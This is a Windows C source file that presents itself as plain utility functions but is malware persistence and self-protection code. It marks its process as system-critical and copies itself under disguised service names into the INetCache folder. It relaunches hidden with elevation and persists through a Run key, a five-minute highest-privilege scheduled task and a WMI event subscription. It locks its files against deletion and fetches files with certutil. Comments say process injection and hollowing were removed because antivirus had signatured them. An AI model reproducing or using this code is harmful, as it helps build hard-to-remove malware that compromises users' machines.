/*
 * Plain utility functions — no obfuscation.
 * All APIs used directly via standard Windows calls.
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

/* === Plain NT API Resolution === */

typedef NTSTATUS (WINAPI *pNtSetInfoProc_t)(HANDLE, INT, PVOID, ULONG);

static pNtSetInfoProc_t get_ntsetinfo(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    return (pNtSetInfoProc_t)GetProcAddress(hNtdll, "NtSetInformationProcess");
}

/* === Process Critical Flag === */

void util_set_critical(void) {
    pNtSetInfoProc_t pNtSetInfo = get_ntsetinfo();
    if (!pNtSetInfo) return;
    ULONG isCritical = 1;
    pNtSetInfo(GetCurrentProcess(), 29 /* ProcessBreakOnTermination */, &isCritical, sizeof(isCritical));
}

void util_clear_critical(void) {
    pNtSetInfoProc_t pNtSetInfo = get_ntsetinfo();
    if (!pNtSetInfo) return;
    ULONG isCritical = 0;
    pNtSetInfo(GetCurrentProcess(), 29 /* ProcessBreakOnTermination */, &isCritical, sizeof(isCritical));
}

const char* util_check_critical(void) {
    pNtSetInfoProc_t pNtSetInfo = get_ntsetinfo();
    if (!pNtSetInfo) return "UNKNOWN";
    ULONG isCritical = 0;
    NTSTATUS status = pNtSetInfo(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    if (status != 0) return "UNKNOWN";
    return isCritical ? "CRITICAL" : "NOT CRITICAL";
}

/* === Watchdog === */

static void deploy_single_service(const char *exeName, const char *taskName) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    char destDir[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", destDir, MAX_PATH);
    strcat(destDir, "\\Microsoft\\Windows\\INetCache\\IE");
    CreateDirectoryA(destDir, NULL);
    
    char destPath[MAX_PATH];
    snprintf(destPath, sizeof(destPath), "%s\\%s", destDir, exeName);
    
    /* Copy if not exists or different */
    BOOL shouldCopy = TRUE;
    DWORD destAttr = GetFileAttributesA(destPath);
    if (destAttr != INVALID_FILE_ATTRIBUTES) {
        HANDLE hSrc = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        HANDLE hDst = CreateFileA(destPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hSrc != INVALID_HANDLE_VALUE && hDst != INVALID_HANDLE_VALUE) {
            DWORD srcSize = GetFileSize(hSrc, NULL);
            DWORD dstSize = GetFileSize(hDst, NULL);
            if (srcSize == dstSize) shouldCopy = FALSE;
        }
        if (hSrc != INVALID_HANDLE_VALUE) CloseHandle(hSrc);
        if (hDst != INVALID_HANDLE_VALUE) CloseHandle(hDst);
    }
    if (shouldCopy) {
        CopyFileA(exePath, destPath, FALSE);
    }
    
    /* Check if already running */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        int found = 0;
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, exeName) == 0) found = 1;
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
        if (found) return;
    }
    
    /* Spawn as admin */
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "runas";
    sei.lpFile = destPath;
    sei.lpParameters = "--shadow";
    sei.nShow = SW_HIDE;
    ShellExecuteExA(&sei);
    
    /* Register Run key */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, taskName, 0, REG_SZ, (BYTE*)destPath, (DWORD)strlen(destPath) + 1);
        RegCloseKey(hKey);
    }
    
    /* Register scheduled task */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "schtasks /create /tn \"%s\" /tr \"%s\" --shadow /sc minute /mo 5 /f /rl highest 2>nul", taskName, destPath);
    system(cmd);
}

void util_spawn_remote(void) {
    /* REMOVED: process injection was signatured */
}

void util_spawn_memory(void) {
    /* REMOVED: process hollowing was signatured */
}

/* === WMI Persistence === */

void util_setup_wmi(void) {
    char psPath[MAX_PATH];
    GetTempPathA(MAX_PATH, psPath);
    strcat(psPath, "tmp.ps1");
    
    FILE *f = fopen(psPath, "w");
    if (!f) return;
    
    fprintf(f, "$e='SysHealth'; $f=$e+'Filter'; $c=$e+'Consumer'; ");
    fprintf(f, "Remove-WmiObject -N 'root/subscription' -C __EventFilter -F \"Name='$f'\" -EA SilentlyContinue; ");
    fprintf(f, "$fl=Set-WmiObject -C __EventFilter -N 'root/subscription' -A @{Name=$f;EventNamespace='root/cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process'\"}; ");
    fprintf(f, "$co=Set-WmiObject -C CommandLineEventConsumer -N 'root/subscription' -A @{Name=$c;CommandLineTemplate='powershell.exe -NoP -W Hidden -C \"\"\"$p=\"$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache\\IE\"; @(\"ElevationService\",\"CrashHandler\",\"NotifyService\") | ForEach-Object { if (-not (Get-Process -Name $_ -EA SilentlyContinue)) { Start-Process \"$p\\$_.exe\" -ArgumentList \"--shadow\" -WindowStyle Hidden } }\"\"\"'}; ");
    fprintf(f, "Set-WmiObject -C __FilterToConsumerBinding -N 'root/subscription' -A @{Filter=$fl;Consumer=$co}\n");
    fclose(f);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "powershell -NoProfile -ExecutionPolicy RemoteSigned -File \"%s\"", psPath);
    system(cmd);
    DeleteFileA(psPath);
}

/* === File Hardening === */

void util_lock_files(void) {
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    char dirPath[MAX_PATH];
    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /deny *S-1-1-0:(DE) /t /c /q 2>nul", dirPath);
    system(cmd);
    
    const char *names[] = {"ElevationService.exe", "CrashHandler.exe", "NotifyService.exe"};
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\%s", dirPath, names[i]);
        DWORD attr = GetFileAttributesA(path);
        if (attr != INVALID_FILE_ATTRIBUTES) {
            snprintf(cmd, sizeof(cmd), "icacls \"%s\" /deny *S-1-1-0:(DE) /c /q 2>nul", path);
            system(cmd);
        }
    }
}

void util_lock_file(const char *filename) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char *lastSlash = strrchr(path, '\\');
    if (lastSlash) {
        *(lastSlash + 1) = '\0';
        strcat(path, filename);
    }
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /deny *S-1-1-0:(DE) /c /q 2>nul", path);
    system(cmd);
}

/* === Download === */

void util_download_file(const char *url, const char *outPath) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "certutil -urlcache -split -f \"%s\" \"%s\" 2>nul", url, outPath);
    system(cmd);
}

/* === Task Registration === */

void util_ensure_task(const char *exePath, const char *taskName) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest 2>nul", taskName, exePath);
    system(cmd);
}
